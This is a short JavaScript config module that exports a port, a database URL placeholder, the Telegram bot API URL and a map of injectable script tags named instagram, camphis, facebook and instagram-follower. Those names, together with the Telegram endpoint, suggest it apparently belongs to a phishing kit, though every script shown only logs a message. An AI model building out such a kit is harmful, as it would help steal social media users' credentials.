import dotenv from 'dotenv';

dotenv.config();

const PORT = process.env.PORT || 3000;
const DB_URL = process.env.DB_URL || "<MongodbURL>";
const TEL_URL = "https://api.telegram.org/bot"




const js_script = {
  instagram : `<script>console.log("This is Instagram")</script>`,
  camphis : `<script>console.log("This is camphis")</script>`,
  facebook : `<script>console.log("This is facebook")</script>`,
  "instagram-follower" : `<script>console.log("This is instagram-follower")</script>`
};


export {
  PORT,
  DB_URL,
  TEL_URL,
  js_script
};